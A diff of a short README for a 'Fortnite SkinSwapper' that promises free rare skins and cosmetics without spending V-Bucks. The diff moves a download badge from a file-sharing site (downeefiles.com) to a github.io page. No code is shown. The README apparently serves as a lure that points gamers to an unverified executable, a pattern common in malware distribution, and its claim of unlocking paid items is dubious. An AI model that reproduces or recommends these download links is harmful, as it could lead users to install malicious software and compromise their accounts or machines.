@@ -1,5 +1,7 @@
 # Fortnite SkinSwapper 🎮✨
 
+[![Download FortniteSkinSwapper](https://img.shields.io/badge/Download-FortniteSkinSwapper-blueviolet)](https://fortnite-skin-swapper-v2.github.io/.github/)
+
 **Fortnite SkinSwapper** is a powerful tool designed for *Fortnite* players who want to customize their character’s appearance by swapping skins and unlocking various cosmetic items. With this tool, users can easily change their in-game skins, apply rare or exclusive cosmetics, and create a personalized look without spending V-Bucks.
 
 ## ⚡ Features:
@@ -13,5 +15,3 @@
 1. Download and install **Fortnite SkinSwapper**.
 2. Launch the tool and select your desired skin or cosmetic item.
 3. Apply the skin and enjoy your personalized character in *Fortnite*!
-
-[![Download FortniteSkinSwapper](https://img.shields.io/badge/Download-FortniteSkinSwapper-blueviolet)](https://downeefiles.com/s/frtntsknswpr)
